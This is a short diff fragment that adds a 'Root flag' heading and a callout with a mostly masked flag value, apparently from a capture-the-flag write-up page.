+
+### Root flag
+
+<Callout type="success" title="Root flag">
+  803**************************aaa
+</Callout>
